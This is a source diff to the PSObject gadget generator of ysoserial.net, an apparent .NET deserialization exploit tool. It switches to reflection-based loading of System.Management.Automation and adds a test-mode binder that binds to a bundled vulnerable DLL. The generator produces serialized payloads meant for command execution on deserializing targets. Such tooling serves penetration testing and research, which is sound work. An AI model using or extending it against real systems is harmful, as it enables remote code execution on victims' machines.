@@ -1,8 +1,10 @@
 ﻿using System;
 using System.Runtime.Serialization;
-using System.Management.Automation;
 using System.Collections.Generic;
 using ysoserial.Helpers;
+using System.Runtime.Serialization.Formatters.Binary;
+using System.Reflection;
+using System.IO;
 
 namespace ysoserial.Generators
 {
@@ -17,8 +19,9 @@ namespace ysoserial.Generators
         string _xml;
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
-            Type typePso = typeof(PSObject);
-            info.SetType(typePso);
+            Assembly asm = Assembly.Load("System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
+            info.SetType(asm.GetType("System.Management.Automation.PSObject"));
+            //info.SetType(typeof(System.Management.Automation.PSObject));
             info.AddValue("CliXml", _xml);
         }
         public PsObjectMarshal(string xml)
@@ -61,6 +64,8 @@ namespace ysoserial.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
+            Assembly asm = Assembly.LoadFile(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + @"\dlls\System.Management.Automation.dll");
+
             inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
             
             String cmdPart;
@@ -147,8 +152,46 @@ namespace ysoserial.Generators
             }
 
             PsObjectMarshal payload = new PsObjectMarshal(clixml);
+
+            if(inputArgs.Test)
+                serializationBinder = new LocalBinder(); // to use the vulnerable version when testing flag has been set
+
             return Serialize(payload, formatter, inputArgs);
         }
 
+    }
+
+    class LocalBinder : SerializationBinder
+    {
+        public override Type BindToType(string assemblyName, string typeName)
+        {
+            Type ttd = null;
+            try
+            {
+                if (typeName == "System.Management.Automation.PSObject")
+                {
+                    Assembly asm = Assembly.LoadFile(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + @"\dlls\System.Management.Automation.dll"); // to load a vulnerable version (it's DLL has been recompiled using version 1.3.3.7 so this will be used instead of GAC)
+                    ttd = asm.GetType("System.Management.Automation.PSObject");
+                }
+                else
+                {
+                    string toassname = assemblyName.Split(',')[0];
+                    Assembly[] asmblies = AppDomain.CurrentDomain.GetAssemblies();
+                    foreach (Assembly ass in asmblies)
+                    {
+                        if (ass.FullName.Split(',')[0] == toassname)
+                        {
+                            ttd = ass.GetType(typeName);
+                            break;
+                        }
+                    }
+                }
+            }
+            catch (System.Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            return ttd;
+        }
     }
 }
